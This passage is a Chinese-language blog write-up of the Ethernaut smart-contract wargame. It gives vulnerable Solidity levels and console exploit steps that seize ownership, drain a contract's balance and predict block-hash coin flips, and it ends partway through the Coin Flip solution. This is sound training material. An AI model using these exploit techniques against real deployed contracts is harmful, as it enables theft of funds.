<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
<meta http-equiv="content-language" content="zh-cn">

<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<style>
    .pace .pace-progress {
        background: #ff009e;
        height: 3px;
    }
    .pace .pace-progress-inner {
         box-shadow: 0 0 10px #e6006b, 0 0 5px #ff009e;
    }
    .pace .pace-activity {
        border-top-color: #ff009e;
        border-left-color: #ff009e;
    }
</style>












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Solidity,Smart Contract,Ethernaut,">





  <link rel="alternate" href="/atom.xml" title="pikachu's Blog" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.0">






<meta name="description" content="前言  22 shop 这题貌似已经下线，嘤嘤嘤嘤 记录一下刚学习 Smart Contract 做题的平台的 WP （2333入门级，开心就好～～～），如果没有任何基础，可以参考 CryptoZombies 等教程，下面是题目平台地址： https://ethernaut.openzeppelin.com/">
<meta name="keywords" content="Solidity,Smart Contract,Ethernaut">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut -- Smart Contract">
<meta property="og:url" content="https://hitcxy.com/2019/ethernaut/index.html">
<meta property="og:site_name" content="pikachu&#39;s Blog">
<meta property="og:description" content="前言  22 shop 这题貌似已经下线，嘤嘤嘤嘤 记录一下刚学习 Smart Contract 做题的平台的 WP （2333入门级，开心就好～～～），如果没有任何基础，可以参考 CryptoZombies 等教程，下面是题目平台地址： https://ethernaut.openzeppelin.com/">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/1.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/2.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/3.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/4.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/6.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/7.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/8.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/9.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/10.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/11.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/12.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/13.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/14.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/15.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/16.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/17.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/18.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/19.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/20.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/21.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/22.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/23.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/24.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/25.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/27.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/28.jpeg">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/29.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/30.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/31.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/32.png">
<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/33.png">
<meta property="og:updated_time" content="2020-09-25T15:00:32.565Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ethernaut -- Smart Contract">
<meta name="twitter:description" content="前言  22 shop 这题貌似已经下线，嘤嘤嘤嘤 记录一下刚学习 Smart Contract 做题的平台的 WP （2333入门级，开心就好～～～），如果没有任何基础，可以参考 CryptoZombies 等教程，下面是题目平台地址： https://ethernaut.openzeppelin.com/">
<meta name="twitter:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"right","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: 'RI3NF6GUI0',
      apiKey: '3d33fa60ba30d3b17f37220bb1a36749',
      indexName: 'blogIndex',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://hitcxy.com/2019/ethernaut/">



<script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>


  <title> Ethernaut -- Smart Contract | pikachu's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  



  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-right page-post-detail ">
    <div class="headband"></div>

	<a href="https://github.com/hitcxy/blog" rel="external nofollow noopener noreferrer" target="_blank"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/82b228a3648bf44fc1163ef44c62fcc60081495e/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f7265645f6161303030302e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png"></a>


    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">pikachu's Blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <h1 class="site-subtitle" itemprop="description">Easy coding,easy life.</h1>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-guestbook">
          <a href="/guestbook" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-commenting"></i> <br>
            
            留言
          </a>
        </li>
      
        
        <li class="menu-item menu-item-links">
          <a href="/links" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
            
            友链
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="https://hitcxy.com/2019/ethernaut/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="pikachu">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar/1.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="pikachu's Blog">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="pikachu's Blog" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
            
            
              
                Ethernaut -- Smart Contract
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-20T22:00:29+08:00">
                2019-09-20
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2020-09-25T23:00:32+08:00">
                2020-09-25
              </time>
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Solidity/" itemprop="url" rel="index">
                    <span itemprop="name">Solidity</span>
                  </a>
                </span>

                
                
              
            </span>
          


          

          

          

          
          
             <span id="/2019/ethernaut/" class="leancloud_visitors" data-flag-title="Ethernaut -- Smart Contract">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          <br><span class="post-time">
           <span class="post-meta-item-icon">
             <i class="fa fa-edit"></i>
           </span>
           <span class="post-meta-item-text">WordCount:</span>
           <span class="post-count">10,596字</span>
			<span class="post-meta-divider">|</span>
			<span class="post-meta-item-text">min2read:</span>
           <span class="post-count">53分钟</span>

         </span>

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/1.png" alt><br><strong>前言</strong></p>
<ul>
<li><code>22 shop</code> 这题貌似已经下线，嘤嘤嘤嘤</li>
<li>记录一下刚学习 <span id="inline-green">Smart Contract</span> 做题的平台的 <code>WP</code> （2333入门级，开心就好～～～），如果没有任何基础，可以参考 <a href="https://cryptozombies.io/zh/" rel="external nofollow noopener noreferrer" target="_blank">CryptoZombies</a> 等教程，下面是题目平台地址：</li>
<li><a href="https://ethernaut.openzeppelin.com/" rel="external nofollow noopener noreferrer" target="_blank">https://ethernaut.openzeppelin.com/</a></li>
</ul>
<a id="more"></a>
<h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><ul>
<li>熟悉关卡挑战的模式，以及执行操作的方式，根据其介绍一步一步操作即可</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/2.png" alt></p>
<ul>
<li>由于网络不太稳定的原因，可以多试几次，成功的结果花里胡哨的23333</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/3.png" alt><br><br></p>
<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><h2 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>you claim ownership of the contract</code></li>
<li><code>you reduce its balance to 0</code></li>
</ul>
<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fallback</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] = contributions[msg.sender].add(msg.value);</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li><p>合约可以有一个未命名的函数。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识匹配（或没有提供调用数据），那么这个函数（ <code>fallback</code> 函数）会被执行。除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币， <code>fallback</code> 函数必须标记为 <code>payable</code> 。</p>
</li>
<li><p>很明显我们如果通过反复调用 <code>contribute</code> 来触发 <code>owner</code> 不现实，因为我们每次最多向合约贡献不大于 <code>0.001 ether</code> ，而要超过 <code>owner</code> 需要 <code>1000 ether</code> （构造函数赋予 <code>owner</code> 的）。但我们惊喜地发现 <code>fallback</code> 函数同样可以改变 <code>owner</code> 的值，那么对应的操作就非常清晰了：</p>
<ul>
<li>调用合约的 <code>contribute</code> 使得合约中我们账户对应的 <code>balance</code> 大于 <code>0</code> </li>
<li>触发 <code>fallback</code> 函数使得合约对应的 <code>owner</code> 变成我们</li>
<li>调用 <code>withdraw</code> 函数清空 <code>balance</code></li>
</ul>
</li>
</ul>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1</span></span><br><span class="line"><span class="keyword">await</span> contract.contribute(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">// step 2，使用 sendTransaction 函数触发 fallback 函数执行</span></span><br><span class="line"><span class="keyword">await</span> contract.sendTransaction(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">// step 3</span></span><br><span class="line"><span class="keyword">await</span> contract.withdraw();</span><br><span class="line"><span class="comment">// 此时调用 owner 函数可以确认合约的 owner 是否已经变成了我们所对应的地址了</span></span><br><span class="line"><span class="keyword">await</span> contract.owner();</span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><h2 id="Require-1"><a href="#Require-1" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Claim ownership of the contract below to complete this level.</code></li>
</ul>
<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>我们可以发现一个很明显的问题，理论上应该写成 <code>Fallout</code> 的构造函数被写成了 <code>Fal1out</code> ，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。</li>
</ul>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用该函数，修改 owner</span></span><br><span class="line"><span class="keyword">await</span> contract.Fal1out();</span><br><span class="line"><span class="comment">// 可以确认是否修改成功</span></span><br><span class="line"><span class="keyword">await</span> contract.owner();</span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><h2 id="Require-2"><a href="#Require-2" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you&#39;ll need to use your psychic abilities to guess the correct outcome 10 times in a row.</code></li>
</ul>
<h2 id="Source-2"><a href="#Source-2" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">CoinFlip</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number.sub(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li><p>代码处理流程为：</p>
<ul>
<li>获得上一块的 <code>hash</code> 值</li>
<li>判断与之前保存的 <code>hash</code> 值是否相等，相等则会退</li>
<li>根据 <code>blockValue/FACTOR</code> 的值判断为正或负，即通过 <code>hash</code> 的首位判断</li>
</ul>
</li>
<li><p>以太坊区块链上的所有交易都是确定性的状态转换操作，每笔交易都会改变以太坊生态系统的全球状态，并且是以一种可计算的方式进行，这意味着其没有任何的不确定性。所以在区块链生态系统内，不存在熵或随机性的来源。如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是 <code>Gas</code> 上限等作为随机数的熵源，产生的随机数并不安全。</p>
</li>
</ul>
<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span 